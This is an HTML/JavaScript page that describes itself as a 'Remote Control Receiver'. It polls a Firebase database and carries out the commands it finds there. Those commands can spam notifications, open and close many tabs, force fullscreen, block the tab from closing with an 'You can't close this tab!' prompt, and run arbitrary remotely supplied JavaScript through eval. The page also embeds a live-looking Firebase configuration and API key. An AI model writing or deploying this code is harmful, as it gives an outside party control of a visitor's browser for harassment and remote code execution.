<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Notifier - Remote Control Receiver</title>
</head>
<body>
<h1>Notifier Tab - Listening for commands</h1>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
    authDomain: "notify-78da1.firebaseapp.com",
    databaseURL: "https://notify-78da1-default-rtdb.firebaseio.com",
    projectId: "notify-78da1",
    storageBucket: "notify-78da1.appspot.com",
    messagingSenderId: "936289141781",
    appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // Request notification permission on load
  if (Notification.permission !== "granted") {
    Notification.requestPermission();
  }

  // Track tabs opened for auto-close
  const openedTabs = [];

  // Listen for new commands added in Firebase
  const commandsRef = db.ref('commands');
  commandsRef.on('child_added', async snapshot => {
    const cmd = snapshot.val();
    if (!cmd || cmd.delivered) return;

    // Mark command as delivered
    snapshot.ref.update({ delivered: true });

    switch (cmd.type) {
      case 'notification':
        for(let i=0; i < (cmd.repeat || 1); i++) {
          setTimeout(() => {
            new Notification(cmd.title, {
              body: cmd.message,
              silent: cmd.sound === '' ? true : false
            });
          }, (cmd.scheduleDelay || 0) + i * 1000);
        }
        break;

      case 'massTabOpen':
        for(let i = 0; i < cmd.count; i++) {
          setTimeout(() => {
            const newTab = window.open(cmd.url, '_blank');
            if (cmd.autoClose) {
              setTimeout(() => newTab.close(), cmd.autoCloseTime * 1000);
            }
            openedTabs.push(newTab);
          }, i * cmd.delay);
        }
        break;

      case 'advanced':
        if (cmd.forceFullscreen) {
          if (document.fullscreenElement == null) {
            document.documentElement.requestFullscreen().catch(() => {});
          }
        }
        if (cmd.disableClose) {
          window.onbeforeunload = () => "You can't close this tab!";
        }
        if (cmd.muteAudio) {
          document.querySelectorAll('video,audio').forEach(media => media.muted = true);
        }
        if (cmd.unmuteAudio) {
          document.querySelectorAll('video,audio').forEach(media => media.muted = false);
        }
        if (cmd.injectJS) {
          try {
            eval(cmd.injectJS);
          } catch(e) {
            console.error("Error in injected JS:", e);
          }
        }
        break;
    }
  });
</script>
</body>
</html>
